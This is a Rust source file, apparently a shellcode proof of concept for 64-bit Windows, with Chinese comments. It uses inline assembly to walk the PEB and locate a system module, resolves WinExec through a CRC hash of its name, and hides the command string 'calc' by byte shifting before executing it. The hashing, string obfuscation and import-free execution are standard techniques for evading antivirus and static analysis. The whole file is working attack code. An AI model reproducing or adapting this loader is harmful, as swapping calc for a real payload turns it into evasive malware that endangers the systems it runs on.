#![cfg(not(test))]
#![no_std]
#![no_main]
#![allow(non_snake_case, non_camel_case_types)]
mod bind;
mod utils;
#[cfg(not(test))]
#[no_mangle]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
use bind::c_char;
use core::arch::asm;
use utils::get_fun_from_module_with_crc;

#[no_mangle]
pub extern "C" fn main() {
    let mut kernel32_base_address: u64;
    unsafe {
        asm!(
            "xor rax, rax",
            "mov rax, gs:[0x60]", // 64位系统中，PEB位于GS:0x60
            "mov rax, [rax + 0x18]", // PEB->Ldr
            "mov rax, [rax + 0x20]", // Ldr->InLoadOrderModuleList.Flink (第一个条目)
            "mov rsi, [rax]", // 指向第二个模块（通常是ntdll.dll）
            "mov rsi, [rsi]", // 指向第三个模块（可能是kernelbase.dll或kernel32.dll，取决于系统和配置）
            "mov rax, rsi",
            "mov rax, [rax + 0x20]", // 获取模块基址，64位系统中偏移量是0x20
            "mov {0}, rax",
            out(reg) kernel32_base_address,
            options(nostack)
        );
    }
    // let GetProcAddress: extern "system" fn(HMODULE, *const c_char) -> usize = unsafe {
    //     core::mem::transmute(get_fun_from_module_with_crc(
    //         kernel32_base_address as _,
    //         0x35c1f38c,
    //     ))
    // };

    // let LoadLibrary: extern "system" fn(*const c_char) -> HMODULE = unsafe {
    //     core::mem::transmute(get_fun_from_module_with_crc(
    //         kernel32_base_address as _,
    //         0xda2df7b,
    //     ))
    // };


    let mut lpFile = [b'c' + 4, b'a' + 3, b'l' + 2, b'c' + 1, 0];
    core::hint::black_box({
        for (i, c) in lpFile.iter_mut().enumerate() {
            *c -= (4 - i) as u8;
        }
        0
        // for i in 0..4 {
        //     lpFile[i] -= (4-i) as u8;
        // }
    });

    let WinExec: extern "system" fn(*const c_char, i32) -> i32 = unsafe {
        core::mem::transmute(get_fun_from_module_with_crc(
            kernel32_base_address as _,
            0x4a0786a0,
        ))
    };
    WinExec(lpFile.as_ptr() as *const c_char, 0);

}

#[no_mangle]
fn rust_eh_personality() {}
